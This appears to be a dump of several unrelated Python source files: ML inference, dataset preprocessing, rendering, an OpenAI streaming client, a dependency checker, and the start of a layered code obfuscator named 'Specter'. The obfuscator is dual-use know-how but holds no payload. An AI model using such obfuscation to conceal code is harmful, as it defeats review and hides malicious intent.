with the datasets' filtering process with multiple processes\n        print(\"Filtering finished.\")\n\n    dataset.set_format(\"numpy\", columns=dataset_keys)\n\n    if 'test' not in dataset and 'train' in dataset: \n        logger.warn('Test shard is not in the dataset, will split the dataset automatically')\n        dataset = dataset['train'].train_test_split(test_size=0.1)\n    else: \n        logger.error('Unknown split names, the dataset should either contain an `train` or `test`split')\n    \n    train_embeddings = dataset['train'][embedding_key]\n    test_embeddings = dataset['test'][embedding_key]\n\n    test_labels = list()\n\n    for label_key in label_keys: \n        test_labels.append(dataset['test'][label_key])\n\n    unique_keys: List[List] = list()\n\n    for label_idx, label_key in enumerate(label_keys):\n        unique_keys.append(list())\n\n        cur_labels = test_labels[label_idx]\n        for cur_label in cur_labels: \n            if cur_label not in unique_keys[-1]: \n                print(f\"Adding {cur_label} for {label_key}\")\n                unique_keys[-1].append(cur_label)\n\n\n    # import sys  \n    print(\"\\n\\n\\n\", unique_keys)\n    max_unique_key_len = 0 \n    for unique_key in unique_keys:\n        max_unique_key_len = max(len(unique_key), max_unique_key_len)\n    print(max_unique_key_len, \"\\n\\n\\n\")\n    # sys.exit(0)\n\n    plots = list()\n        \n    title=\"-\".join([prefix_name, embedding_key, *label_keys])\n    segmented_title = \"\"\n    cur_pos = 0 \n    pos_step = 25\n    while cur_pos < len(title):\n        segmented_title += title[cur_pos: cur_pos+pos_step] + \"\\n\"\n        cur_pos += pos_step\n \n \n    print(f\"Original Title was: {title}\\nSegmented title is: {segmented_title}\\n\")\n    p = figure(title = segmented_title, frame_width=fw, frame_height=fh, background_fill_color=\"#fafafa\")\n   \n    cur_embeddings = train_embeddings\n    projector_name = exp_name\n    projector_path = os.path.join(projection_base_path ,f\"{projector_name}_manifoldlearning.pickle\")\n    projector_sklearn_api = None\n    if os.path.exists(projector_path) and not FORCE_RERUN:\n   ",
    "from datetime import datetime\nimport re\n\ndef generate():\n    with open(\"./README.md\") as f:\n        readme_content = f.read()\n    \n    readme_replacement = f'Updated: {datetime.now().strftime(\"%d/%m/%Y %H:%M:%S\")}'\n    new_readme = re.sub('Updated: .*', readme_replacement, readme_content)\n\n    with open(\"./README.md\", \"w\") as f:\n        f.write(new_readme)\n\ngenerate()\n\nif False:\n    with open(\"./README.md\", \"rw\") as f:\n        f.write(f'''<p align=\"center\">\n  <source media=\"(prefers-color-scheme: dark)\" srcset=\"https://readme-typing-svg.herokuapp.com?color=%23FFFFFF&size=40&center=true&width=600&height=69&lines=\ud83d\udc4b+Hi+there!+\ud83d\ude0e;\u270b+Welcome+To+My+Profile+\ud83d\ude07;\ud83d\udc68\u200d\ud83d\udcbb+I+love+Programming+\ud83d\udcbb;\ud83c\udf31+Nature+\ud83c\udf38;\ud83c\udf20+Astronomy+\ud83c\udf0c;\ud83e\uddd7\u200d\u2642\ufe0f+Hiking+\ud83d\uddfb;\ud83e\udded+Exploring+\ud83d\uddfa\ufe0f;\u231b+History+\ud83d\udcdc;\ud83d\uddfe+Anime+\ud83c\udfef;\ud83d\udcf0+Research+\ud83c\udfc6;\ud83c\udfbc+And+create+some+Music+\ud83c\udfb5\" />\n  <source media=\"(prefers-color-scheme: light)\" srcset=\"https://readme-typing-svg.herokuapp.com?color=%23000000&size=40&center=true&width=600&height=69&lines=\ud83d\udc4b+Hi+there!+\ud83d\ude0e;\u270b+Welcome+To+My+Profile+\ud83d\ude07;\ud83d\udc68\u200d\ud83d\udcbb+I+love+Programming+\ud83d\udcbb;\ud83c\udf31+Nature+\ud83c\udf38;\ud83c\udf20+Astronomy+\ud83c\udf0c;\ud83e\uddd7\u200d\u2642\ufe0f+Hiking+\ud83d\uddfb;\ud83e\udded+Exploring+\ud83d\uddfa\ufe0f;\u231b+History+\ud83d\udcdc;\ud83d\uddfe+Anime+\ud83c\udfef;\ud83d\udcf0+Research+\ud83c\udfc6;\ud83c\udfbc+And+create+some+Music+\ud83c\udfb5\" />\n  <img src=\"https://readme-typing-svg.herokuapp.com?color=%23FFFFFF&size=40&center=true&width=600&height=69&lines=\ud83d\udc4b+Hi+there!+\ud83d\ude0e;\u270b+Welcome+To+My+Profile+\ud83d\ude07;\ud83d\udc68\u200d\ud83d\udcbb+I+love+Programming+\ud83d\udcbb;\ud83c\udf31+Nature+\ud83c\udf38;\ud83c\udf20+Astronomy+\ud83c\udf0c;\ud83e\uddd7\u200d\u2642\ufe0f+Hiking+\ud83d\uddfb;\ud83e\udded+Exploring+\ud83d\uddfa\ufe0f;\u231b+History+\ud83d\udcdc;\ud83d\uddfe+Anime+\ud83c\udfef;\ud83d\udcf0+Research+\ud83c\udfc6;\ud83c\udfbc+And+create+some+Music+\ud83c\udfb5\" alt=\"Typing SVG\">\n  <img width=\"100%\" src=\"https://cardivo.vercel.app/api?name=Azhar%20Rizki%20Zulma&description=Hi,%20I%27m%20a%20Information%20System,%20Software%20Quality%20Assurance,%20and%20Multiplatform%20Developer%20with%20a%20demonstrated%20history%20of%20working%20in%20the%20information%20technology%20industry%20%F0%9F%91%8B&image=https://id.zulma.id/assets/images/azhar.png&instagram=AzharRizkyZ&linkedin=Azhar%20Rizki%20Zulma&github=AzharRizkiZ&twitter=AzharRizkyZ&pattern=floatingCogs&opacity=0.1&backgroundColor=%23ddd&site=https://zulma.id\">\n</p>\n\n<details>\n  <summary align=\"center\"><h1>\ud83d\udcdb Holopin Badges \ud83d\udd30</h1></summary>\n  <p align=\"center\">\n    <a href=\"https://holopin.io/@azharrizky\">\n      <img src=\"https://holopin.me/azharrizky\" alt=\"@azharrizky's Holopin board\">\n    </a>\n  </p>\n</details>\n\n<details>\n  <summary align=\"center\"><h1>\ud83d\udcc8 Github Statistic \ud83d\udcca</h1></summary>\n  <p align=\"center\">\n    <a href=\"https://github.com/azharrizkiz\">\n      <img width=\"60.2%\" src=\"https://github-readme-stats-eight-theta.vercel.app/api?username=azharrizkiz&show_icons=true&theme=dark&include_all_commits=true&count_private=true&icon_color=FFFFFF&bg_color=000000\"/>\n      <img width=\"38.4%\" src=\"https://github-readme-stats-eight-theta.vercel.app/api/top-langs/?username=azharrizkiz&layout=compact&langs_count=10&theme=dark&bg_color=000000\"/>\n      <img width=\"49.1%\" src=\"https://github-readme-streak-stats.herokuapp.com/?user=AzharRizkiZ&theme=highcontrast&fire=ffffff&ring=ffffff&border=ffffff&currStreakLabel=ffffff\"/>\n      <img width=\"49.6%\" src=\"https://github-profile-trophy.vercel.app/?username=azharrizkiz&theme=onestar&column=5&margin-w=10&margin-h=10\"/>\n      <img width=\"99.4%\" src=\"https://github-readme-activity-graph.vercel.app/graph?username=AzharRizkiZ&theme=react-dark&bg_color=000000&color=FFFFFF\"/>\n    </a>\n  </p>\n</details>\n\n<details>\n  <summary align=\"center\"><h1>\ud83d\udcc8 Github Metrics \ud83d\udcca</h1></summary>\n  <p align=\"center\">\n    <a href=\"https://github.com/azharrizkiz\">\n      <img src=\"metrics.plugin.topics.mastered.svg\" alt=\"Metrics\"/>\n      <img src=\"metrics.plugin.people.followers.svg\" alt=\"Metrics\"/>\n      <img src=\"metrics.plugin.languages.details.svg\" alt=\"Metrics\"/>\n      <img src=\"metrics.plugin.calendar.svg\" alt=\"Metrics\"/>\n      <img src=\"metrics.plugin.achivements.svg\" alt=\"Metrics\"/>\n      <!-- <img src=\"metrics.plugin.personal.anilist.svg\" alt=\"Metrics\"/> -->\n      <img src=\"metrics.plugin.pagespeed.svg\" alt=\"Metrics\"/>\n      <!-- <img src=\"metrics.plugin.gists.svg\" alt=\"Metrics\"/> -->\n    </a>\n  </p>\n</details>\n\n<details>\n  <summary align=\"center\"><h1>\ud83d\udc0d Snake \ud83d\udc1b</h1></summary>\n  <p align=\"center\">\n    <picture>\n      <source media=\"(prefers-color-scheme: dark)\" srcset=\"https://github.com/AzharRizkiZ/AzharRizkiZ/blob/snek-output/grid-snake-dark.svg\" />\n      <source media=\"(prefers-color-scheme: light)\" srcset=\"https://github.com/AzharRizkiZ/AzharRizkiZ/blob/snek-output/grid-snake-light.svg\" />\n      <img alt=\"GitHub contribution Snek animation\" src=\"https://github.com/AzharRizkiZ/AzharRizkiZ/blob/snek-output/grid-snake.svg\" />\n    </picture>\n  </p>\n</details>\n\n<details>\n  <summary align=\"center\"><h1>\ud83c\udfa8 Artwork \ud83d\uddbc\ufe0f</h1></summary>\n  <p align=\"center\">\n    <a href=\"https://github.com/azharrizkiz\">\n      <img width=\"100%\" src=\"./gitartwork.svg\">\n    </a>\n  </p>\n</details>\n\n<details>\n  <summary align=\"center\"><h1 align=\"center\">\ud83c\udfb6 Listen Now \ud83c\udfa7</h1></summary>\n  <p align=\"center\">\n    <a href=\"https://spotify-github-profile.vercel.app/api/view?uid=7zvqbn3nvuqnm2ypk2ib1y1sp&redirect=true\">\n      <img wi",
    "import torch\nimport numpy as np\nfrom torchvision.transforms import ToTensor\n\nGPU_EFFICIENT_SAM_CHECKPOINT = \"efficient_sam_s_gpu.jit\"\nCPU_EFFICIENT_SAM_CHECKPOINT = \"efficient_sam_s_cpu.jit\"\n\n\ndef load(device: torch.device) -> torch.jit.ScriptModule:\n    if device.type == \"cuda\":\n        model = torch.jit.load(GPU_EFFICIENT_SAM_CHECKPOINT)\n    else:\n        model = torch.jit.load(CPU_EFFICIENT_SAM_CHECKPOINT)\n    model.eval()\n    return model\n\n\ndef inference_with_box(\n    image: np.ndarray,\n    box: np.ndarray,\n    model: torch.jit.ScriptModule,\n    device: torch.device\n) -> np.ndarray:\n    bbox = torch.reshape(torch.tensor(box), [1, 1, 2, 2])\n    bbox_labels = torch.reshape(torch.tensor([2, 3]), [1, 1, 2])\n    img_tensor = ToTensor()(image)\n\n    predicted_logits, predicted_iou = model(\n        img_tensor[None, ...].to(device),\n        bbox.to(device),\n        bbox_labels.to(device),\n    )\n    predicted_logits = predicted_logits.cpu()\n    all_masks = torch.ge(torch.sigmoid(predicted_logits[0, 0, :, :, :]), 0.5).numpy()\n    predicted_iou = predicted_iou[0, 0, ...].cpu().detach().numpy()\n\n    max_predicted_iou = -1\n    selected_mask_using_predicted_iou = None\n    for m in range(all_masks.shape[0]):\n        curr_predicted_iou = predicted_iou[m]\n        if (\n                curr_predicted_iou > max_predicted_iou\n                or selected_mask_using_predicted_iou is None\n        ):\n            max_predicted_iou = curr_predicted_iou\n            selected_mask_using_predicted_iou = all_masks[m]\n    return selected_mask_using_predicted_iou\n\n\ndef inference_with_boxes(\n    image: np.ndarray,\n    xyxy: np.ndarray,\n    model: torch.jit.ScriptModule,\n    device: torch.device\n) -> np.ndarray:\n    masks = []\n    for [x_min, y_min, x_max, y_max] in xyxy:\n        box = np.array([[x_min, y_min], [x_max, y_max]])\n        mask = inference_with_box(image, box, model, device)\n        masks.append(mask)\n    return np.array(masks)\n",
    "import os, glob, shutil, argparse, yaml, re, json\nimport librosa\nfrom tqdm import tqdm\n\nfrom multiprocessing import Pool\n\nimport sys\nsys.path.append(os.path.dirname(os.path.abspath(os.path.dirname(__file__))))\n\nfrom utils import common_utils as cu\nfrom utils import script_utils as su\nfrom utils import wav_utils as wu\nfrom utils import video_utils as vu\n\n_warning = False\n\ndef worker(buff):\n    args = buff['args']\n    metadata = buff['metadata']\n    fn = metadata['video_infos']['file_name']\n    fidx = metadata['video_infos']['index']\n    output_dir = buff['output_dir']\n    wav_path = os.path.join(args.voxmm_dir,'wav',fn+'.wav')\n    vid_path = os.path.join(args.voxmm_dir,'video',fn+'.mp4')\n    face_track_path = os.path.join(args.voxmm_dir,'face_track',fn+'.json')\n\n    if not args.no_wav:\n        src_wav, sr = librosa.load(wav_path, sr=args.sample_rate)\n\n    if not args.no_video:\n        vid_gen = vu.Face_Track_Generator(vid_path, face_track_path, **vars(args))\n        if args.audio_in_video:\n            if args.no_wav:\n                vid_gen.load_audio_from_path(wav_path, args.sample_rate)\n            else:\n                vid_gen.load_audio(src_wav, sr)\n\n    if not args.no_script:\n        script_gen = su.Script_Generator(**vars(args))\n\n    for seg in metadata['segments']:\n        if args.use_vid_index:\n            wav_path, video_path, txt_path = cu.output_destination(str(fidx), seg, output_dir, args.dataset_style)\n        else:\n            wav_path, video_path, txt_path = cu.output_destination(fn, seg, output_dir, args.dataset_style)\n\n        try:\n            # wav generation\n            if not args.no_wav:\n                os.makedirs(os.path.dirname(wav_path),exist_ok=True)\n                wu.crop_wav(src_wav, seg['start'], seg['end'], sr, args.volume, wav_path)\n\n            # vid generation\n            if not args.no_video:\n                os.makedirs(os.path.dirname(video_path),exist_ok=True)\n                if len(seg['face_track'])==1:\n                    vid_gen(seg['face_track'][0]['index'], seg['start'], seg['end'], video_path, args.volume)\n                else:\n                    print(\"Zero or multiple face track detected. Skip this segment. file: {}, seg idx: {}\".format(fn, seg['segment_index']))\n                    continue\n\n\n            # txt generation\n            if not args.no_script:\n                os.makedirs(os.path.dirname(txt_path),exist_ok=True)\n                if args.dataset_style=='librispeech':\n                    with open(txt_path, 'a') as f:\n                        f.write('{} {}\\n'.format(os.path.basename(wav_path).replace('flac',''),script_gen(seg['text'])))\n\n                elif args.dataset_style=='lrs3':\n                    with open(txt_path, 'w') as f:\n                        f.write('Text:  {}\\n'.format(script_gen(seg['text'])))\n\n                else:\n                    raise Exception(f\"Invalid dataset style input: {style}\")\n\n        except Exception as e:\n            print('Error occur while processing the segment. Skip this segment. file: {}, seg idx: {}'.format(fn,seg['segment_index']))\n            print(f'{str(e)}')\n\n\n    if 'vid_gen' in locals():\n        del vid_gen\n    if 'src_wav' in locals():\n        del src_wav\n    if 'script_gen' in locals():\n        del script_gen\n\n\n\ndef asr_preprocessor(args):\n    metadata_dir = os.path.join(args.voxmm_dir,'metadata')\n    segment_list_paths = args.segment_list_paths.replace('[','').replace(']','').split(',')\n    cnt = 0\n    buff = []\n    for segment_list_path in segment_list_paths:\n        print(f'\\nPreprocessing start for {segment_list_path}')\n        output_dir = os.path.join(args.output_dir, os.path.splitext(os.path.basename(segment_list_path))[0])\n        os.makedirs(output_dir,exist_ok=True)\n\n        segment_dict = cu.load_segment_list(segment_list_path.strip())\n        for fn in segment_dict.keys():\n            with open(os.path.join(metadata_dir,fn+'.json'), 'r') as fm:\n                metadata =  json.load(fm)\n                cu.version_check(metadata['metadata_version'])\n\n            metadata['segments'] = [seg for seg in metadata['segments'] if seg['segment_index'] in segment_dict[fn]]\n            if len(metadata['segments'])>0:\n                buff.append({\"args\": args, \"metadata\": metadata, \"output_dir\": output_dir})\n                cnt += 1\n                \n\n    p = Pool(args.num_worker)\n    with tqdm(total=len(buff)) as pbar:\n        for _ in tqdm(p.imap_unordered(worker,buff)):\n            pbar.update()\n    p.close()\n    p.join()\n\n    print(f'{cnt} files processed')\n    print('='*20)\n\n\n\nif __name__==\"__main__\":\n    parser = argparse.ArgumentParser(description = \"ASR Preprocessor\")\n\n    parser.add_argument(\"--config\", type=str,   default=None,   help=\"config YAML file\")\n    parser.add_argument(\"--num_worker\", type=int,   default=1,   help=\"number of process\")\n    \n    parser.add_argument(\"--voxmm_dir\", type=str,   default=\"./VoxMM\",   help=\"VoxMM dataset\")\n    parser.add_argument(\"--segment_list_paths\", type",
    "# Copyright (c) 2022, NVIDIA CORPORATION & AFFILIATES.  All rights reserved.\n#\n# NVIDIA CORPORATION & AFFILIATES and its licensors retain all intellectual property\n# and proprietary rights in and to this software, related documentation\n# and any modifications thereto.  Any use, reproduction, disclosure or\n# distribution of this software and related documentation without an express\n# license agreement from NVIDIA CORPORATION & AFFILIATES is strictly prohibited.\n\nimport torch\nimport torch.nn.functional as F\nimport nvdiffrast.torch as dr\nfrom . import Renderer\n\n_FG_LUT = None\n\n\ndef interpolate(attr, rast, attr_idx, rast_db=None):\n    return dr.interpolate(\n        attr.contiguous(), rast, attr_idx, rast_db=rast_db,\n        diff_attrs=None if rast_db is None else 'all')\n\n\ndef xfm_points(points, matrix, use_python=True):\n    '''Transform points.\n    Args:\n        points: Tensor containing 3D points with shape [minibatch_size, num_vertices, 3] or [1, num_vertices, 3]\n        matrix: A 4x4 transform matrix with shape [minibatch_size, 4, 4]\n        use_python: Use PyTorch's torch.matmul (for validation)\n    Returns:\n        Transformed points in homogeneous 4D with shape [minibatch_size, num_vertices, 4].\n    '''\n    out = torch.matmul(torch.nn.functional.pad(points, pad=(0, 1), mode='constant', value=1.0), torch.transpose(matrix, 1, 2))\n    if torch.is_anomaly_enabled():\n        assert torch.all(torch.isfinite(out)), \"Output of xfm_points contains inf or NaN\"\n    return out\n\n\ndef dot(x, y):\n    return torch.sum(x * y, -1, keepdim=True)\n\n\ndef compute_vertex_normal(v_pos, t_pos_idx):\n    i0 = t_pos_idx[:, 0]\n    i1 = t_pos_idx[:, 1]\n    i2 = t_pos_idx[:, 2]\n\n    v0 = v_pos[i0, :]\n    v1 = v_pos[i1, :]\n    v2 = v_pos[i2, :]\n\n    face_normals = torch.cross(v1 - v0, v2 - v0)\n\n    # Splat face normals to vertices\n    v_nrm = torch.zeros_like(v_pos)\n    v_nrm.scatter_add_(0, i0[:, None].repeat(1, 3), face_normals)\n    v_nrm.scatter_add_(0, i1[:, None].repeat(1, 3), face_normals)\n    v_nrm.scatter_add_(0, i2[:, None].repeat(1, 3), face_normals)\n\n    # Normalize, replace zero (degenerated) normals with some default value\n    v_nrm = torch.where(\n        dot(v_nrm, v_nrm) > 1e-20, v_nrm, torch.as_tensor([0.0, 0.0, 1.0]).to(v_nrm)\n    )\n    v_nrm = F.normalize(v_nrm, dim=1)\n    assert torch.all(torch.isfinite(v_nrm))\n\n    return v_nrm\n\n\nclass NeuralRender(Renderer):\n    def __init__(self, device='cuda', camera_model=None):\n        super(NeuralRender, self).__init__()\n        self.device = device\n        self.ctx = dr.RasterizeCudaContext(device=device)\n        self.projection_mtx = None\n        self.camera = camera_model\n\n    def render_mesh(\n            self,\n            mesh_v_pos_bxnx3,\n            mesh_t_pos_idx_fx3,\n            camera_mv_bx4x4,\n            mesh_v_feat_bxnxd,\n            resolution=256,\n            spp=1,\n            device='cuda',\n            hierarchical_mask=False\n    ):\n        assert not hierarchical_mask\n        \n        mtx_in = torch.tensor(camera_mv_bx4x4, dtype=torch.float32, device=device) if not torch.is_tensor(camera_mv_bx4x4) else camera_mv_bx4x4\n        v_pos = xfm_points(mesh_v_pos_bxnx3, mtx_in)  # Rotate it to camera coordinates\n        v_pos_clip = self.camera.project(v_pos)  # Projection in the camera\n\n        v_nrm = compute_vertex_normal(mesh_v_pos_bxnx3[0], mesh_t_pos_idx_fx3.long())  # vertex normals in world coordinates\n\n        # Render the image,\n        # Here we only return the feature (3D location) at each pixel, which will be used as the input for neural render\n        num_layers = 1\n        mask_pyramid = None\n        assert mesh_t_pos_idx_fx3.shape[0] > 0  # Make sure we have shapes\n        mesh_v_feat_bxnxd = torch.cat([mesh_v_feat_bxnxd.repeat(v_pos.shape[0], 1, 1), v_pos], dim=-1)  # Concatenate the pos\n\n        with dr.DepthPeeler(self.ctx, v_pos_clip, mesh_t_pos_idx_fx3, [resolution * spp, resolution * spp]) as peeler:\n            for _ in range(num_layers):\n                rast, db = peeler.rasterize_next_layer()\n                gb_feat, _ = interpolate(mesh_v_feat_bxnxd, rast, mesh_t_pos_idx_fx3)\n\n        hard_mask = torch.clamp(rast[..., -1:], 0, 1)\n        antialias_mask = dr.antialias(\n            hard_mask.clone().contiguous(), rast, v_pos_clip,\n            mesh_t_pos_idx_fx3)\n\n        depth = gb_feat[..., -2:-1]\n        ori_mesh_feature = gb_feat[..., :-4]\n\n        normal, _ = interpolate(v_nrm[None, ...], rast, mesh_t_pos_idx_fx3)\n        normal = dr.antialias(normal.clone().contiguous(), rast, v_pos_clip, mesh_t_pos_idx_fx3)\n        normal = F.normalize(normal, dim=-1)\n        normal = torch.lerp(torch.zeros_like(normal), (normal + 1.0) / 2.0, hard_mask.float())      # black background\n\n        return ori_mesh_feature, antialias_mask, hard_mask, rast, v_pos_clip, mask_pyramid, depth, normal\n",
    "import json\nimport logging\nfrom typing import AsyncGenerator\n\nimport httpx\n\nfrom .betatester_types import OpenAiChatInput\n\nlogger = logging.getLogger(\"betatester\")\n\nTIMEOUT = 30\n\n\nasync def send_openai_request(\n    client: httpx.AsyncClient,\n    request_payload: dict,\n    route: str,\n    api_key: str,\n) -> dict:\n    url = f\"https://api.openai.com/v1/{route}\"\n    headers = {\"Authorization\": f\"Bearer {api_key}\"}\n    response = await client.post(\n        url,\n        headers=headers,\n        json=request_payload,\n        timeout=httpx.Timeout(TIMEOUT),\n    )\n    if response.status_code != 200:\n        response_body = await response.aread()\n        logger.error(\n            f\"Error in OpenAI chat API: {response.status_code} {response_body.decode()}\"\n        )\n    response.raise_for_status()\n    response_output = response.json()\n    return response_output\n\n\nasync def _stream_openai_chat_api(\n    client: httpx.AsyncClient,\n    openai_input: OpenAiChatInput,\n    api_key: str,\n) -> AsyncGenerator[str, None]:\n    async with client.stream(\n        \"POST\",\n        \"https://api.openai.com/v1/chat/completions\",\n        timeout=httpx.Timeout(TIMEOUT),\n        headers={\n            \"Authorization\": f\"Bearer {api_key}\",\n        },\n        json=openai_input.data,\n    ) as response:\n        if response.status_code != 200:\n            # read the response to log the error\n            response_body = await response.aread()\n            logger.error(\n                f\"Error in OpenAI chat API: {response.status_code} {response_body.decode()}\"\n            )\n        response.raise_for_status()\n        async for chunk in response.aiter_text():\n            yield chunk\n\n\nasync def openai_stream_response_generator(\n    client: httpx.AsyncClient,\n    openai_chat_input: OpenAiChatInput,\n    api_key: str,\n) -> AsyncGenerator[dict, None]:\n    content = \"\"\n    func_call = {\"arguments\": \"\"}\n    error_message = None\n    try:\n        async for response in _stream_openai_chat_api(\n            client, openai_chat_input, api_key\n        ):\n            for block_raw in response.split(\"\\n\\n\"):\n                for line in block_raw.split(\"\\n\"):\n                    if line.startswith(\"data:\"):\n                        json_str = line.replace(\"data:\", \"\").strip()\n                        if json_str == \"[DONE]\":\n                            break\n                        else:\n                            try:\n                                block = json.loads(json_str)\n                            # skip any json decode errors\n                            except Exception as e:\n                                logger.debug(e)\n                                continue\n\n                            # we assume that we only need to look at the first choice\n                            choice = block[\"choices\"][0]\n                            delta = choice.get(\"delta\")\n                            if delta is None:\n                                continue\n                            elif \"function_call\" in delta:\n                                name = delta[\"function_call\"].get(\"name\")\n                                if name:\n                                    func_call[\"name\"] = name\n                                arguments = delta[\"function_call\"].get(\n                                    \"arguments\"\n                                )\n                                if arguments:\n                                    func_call[\"arguments\"] += arguments\n                            elif \"content\" in delta:\n                                content += delta[\"content\"]\n                                yield {\"content\": content}\n        if func_call.get(\"name\"):\n            yield {\"func_call\": func_call}\n\n    except Exception as e:\n        logger.error(\"Error in openai_stream_response_generator %s\", str(e))\n        yield {\"error\": error_message}\n",
    "\n\ndef show_mouse_position():\n    return \"\"\"\n(function(){ \n\nfunction luna_createMouseTrail() {\n      const trail = document.createElement('div');\n      trail.style.position = 'fixed';\n      trail.style.top = '0';\n      trail.style.left = '0';\n      trail.style.pointerEvents = 'none';\n      trail.style.zIndex = '9999';\n      trail.style.width = '10px';\n      trail.style.height = '10px';\n      trail.style.borderRadius = '50%';\n      trail.style.backgroundColor = 'black';\n      trail.style.opacity = '0.5';\n      trail.style.transition = 'transform 0.1s ease-out';\n\n      document.body.appendChild(trail);\n\n      const coordinates = document.createElement('div');\n      coordinates.style.position = 'fixed';\n      coordinates.style.top = '10px';\n      coordinates.style.right = '10px';\n      coordinates.style.background = '#fff';\n      coordinates.style.border = '1px solid #000';\n      coordinates.style.padding = '5px';\n      coordinates.style.userSelect = 'none'; // \u7981\u6b62\u9009\u4e2d\u6587\u5b57\n      coordinates.style.zIndex = '9999';\n\n      document.body.appendChild(coordinates);\n\n      document.addEventListener('mousemove', (event) => {\n        const { clientX, clientY } = event;\n        const x = clientX - 5;\n        const y = clientY - 5;\n        trail.style.transform = 'translate(' + x + 'px, ' + y + 'px)';\n        const initialX = clientX;\n        const initialY = clientY;\n        const pageWidth = window.innerWidth;\n        const offsetX = (clientX > window.innerWidth / 2) ? 20 : -80; // \u504f\u79fb\u91cf\n        coordinates.style.right = (window.innerWidth - initialX + offsetX) + 'px';\n        coordinates.style.top = (initialY + 10) + 'px';\n        coordinates.innerHTML = 'X: ' + clientX + ', Y: ' + clientY + '';\n      });\n};\n//\nluna_createMouseTrail();\n\n})();\n\"\"\"\n",
    "from importlib.metadata import Distribution, distributions, distribution\nimport sys\nfrom collections import Counter\n\nimport requests\nfrom packaging.requirements import Requirement\nfrom rich import print\nfrom dataclasses import dataclass\nimport re\n\n\n@dataclass\nclass Metadata:\n    version: str\n    requires: list[Requirement]\n\n    @classmethod\n    def from_pypi(cls, name: str):\n        metadata = requests.get(f\"https://pypi.org/pypi/{name}/json\").json()\n        return cls(\n            version=metadata[\"info\"][\"version\"],\n            requires=[\n                Requirement(req) for req in metadata[\"info\"][\"requires_dist\"] or []\n            ],\n        )\n\n    @classmethod\n    def from_dist(cls, dist: Distribution):\n        return cls(\n            version=dist.version,\n            requires=[Requirement(req) for req in dist.requires or []],\n        )\n\n    def filter(self, dependency: str) -> list[Requirement]:\n        return [req for req in self.requires if req.name == dependency]\n\n    def contains(self, dependency, version) -> dict[Requirement, bool]:\n        return {req: req.specifier.contains(version) for req in self.filter(dependency)}\n\n\ndef extract_repo(dist):\n    urls = {\"Home-page\": dist.metadata.get(\"Home-page\")}\n\n    project_urls = dist.metadata.get_all(\"Project-URL\") or []\n    project_urls = dict(x.split(\", \", maxsplit=1) for x in project_urls)\n    urls.update(project_urls)\n\n    urls = [\n        re.search(r\"https://github.com/[^/]+/[^/]+\", url)\n        for url in urls.values()\n        if url\n    ]\n    urls = Counter(url.group(0) for url in urls if url)\n    if urls:\n        return urls.most_common(1)[0][0]\n\n\ndef main():\n    solution = {}\n    if len(sys.argv) < 2:\n        print(\"usage: pip-blame NAME\")\n        return\n    name = sys.argv[1]\n    installed = distribution(name)\n    latest = Metadata.from_pypi(name)\n    print(f\"[bold]{name} installed={installed.version} latest={latest.version}\\n\")\n\n    for dist in distributions():\n        installed_dist = Metadata.from_dist(dist)\n        installed_contains = installed_dist.contains(name, latest.version)\n        if not installed_contains:\n            continue\n\n        color = \"red\" if False in installed_contains.values() else \"green\"\n        print(f\"[{color}]{dist.name}[/] installed={dist.version}\")\n        for spec in installed_contains:\n            print(f\"  {spec}\")\n        print()\n\n        if False in installed_contains.values():\n            latest_dist = Metadata.from_pypi(dist.name)\n            latest_contains = latest_dist.contains(name, latest.version)\n            # implicit version comparison\n            if False in latest_contains.values():\n                repo = extract_repo(dist)\n                if repo:\n                    repo += \"/issues/new\"\n                print(\n                    \"[yellow]not fixed in the latest version, reach out to maintainers\"\n                )\n                print(f\"{repo}\\n\")\n                solution[dist.name] = (\n                    repo or f\"reach out to [yellow]{dist.name}[/] devs\"\n                )\n            else:\n                print(\n                    f\"[green]{dist.name}[/] latest={latest_dist.version} [green]fixed in latest\"\n                )\n                solution[dist.name] = (\n                    f'pip install \"{dist.name}>={latest_dist.version}\"'\n                )\n                for spec in latest_contains:\n                    print(f\"  {spec}\")\n                print()\n\n    if solution:\n        print(\"[underline yellow]suggested solution:\")\n        for dist, sol in solution.items():\n            print(f\"[red]{dist}[/] {sol}\")\n\n\nif __name__ == \"__main__\":\n    main()\n",
    "from marshal import dumps\r\nfrom binascii import hexlify\r\nfrom random import randint, shuffle\r\n\r\nfrom pystyle import *\r\n\r\n\r\nbanner1 = r\"\"\"\"\"\"[1:]\r\n\r\nbanner2 = r\"\"\"\"\"\"[1:]\r\n\r\n\r\nbanner = Add.Add(banner1, banner2, center=True)\r\n\r\npurple = Col.StaticMIX([Col.blue, Col.purple])\r\n\r\n\r\ndef stage(text: str, symbol: str = \"...\") -> str:\r\n    ppurple = purple if symbol == \"...\" else Col.light_blue\r\n    return f\"\"\" {Col.Symbol(symbol, ppurple, Col.blue)} {ppurple}{text}{Col.reset}\"\"\"\r\n\r\n\r\nclass Specter:\r\n    vars = []\r\n    _B = \"sys\"\r\n    __import__(\"os\").system(\"clear\" if \"linux\" in __import__(_B).platform.lower() else \"cls\")\r\n\r\n    def specterize(script: str) -> str:\r\n        print(stage(\"Starting specterization!\"))\r\n        # print(stage(\"Preparing anti skid layer...\")) just to be sure\r\n        script = Specter.anti_skid(script=script)\r\n        print(stage(\"Adding layer 1!\"))\r\n        script = Specter.layer_1(script=script)\r\n        print(stage(\"Adding layer 2!\"))\r\n        script = Specter.layer_2(script=script)\r\n        print(stage(\"Adding layer 3!\"))\r\n        script = Specter.layer_3(script=script)\r\n        return script\r\n\r\n    def hex(text: str) -> bytes:\r\n        return \"b'\" + \"\".join(rf\"\\x{hexlify(t.encode('utf-8')).decode()}\" for t in text) + \"'\"\r\n\r\n    def encrypt(text: str, key: int) -> str:\r\n        return \"\\x00\".join(str(ord(x) + key) for x in text)\r\n\r\n    def randvar() -> str:\r\n        var = randint(1000, 9999)\r\n        while var in Specter.vars:\r\n            var = randint(1000, 9999)\r\n        Specter.vars.append(var)\r\n        return f\"__{var}__\"\r\n\r\n    def get_key_by_value(vars, key) -> str:\r\n        return list(vars.keys())[list(vars.values()).index(key)]\r\n\r\n    def anti_skid(script: str) -> str:\r\n        return (\r\n            r\"\"\"\r\ntry:\r\n    if (\r\n        \r\n        __license__ != \"EPL-2.0\" or\r\n        __code__ != \"print('Hello world!')\" or\r\n        \"Specter\" not in globals() or\r\n        \"Func\" not in globals()\r\n    ):\r\n        int('skid')\r\nexcept:\r\n    input(\"You just executed a file obfuscated with Calculate!\")\r\n    __import__('sys').exit()    \r\n\r\n\r\n\"\"\"[\r\n                1:\r\n            ]\r\n            + script\r\n        )\r\n\r\n    def layer_1(script: str) -> str:\r\n        ten_split = []\r\n        key = randint(3, 33)\r\n        splitting = randint(3, 9)\r\n        while True:\r\n            if len(script) >= 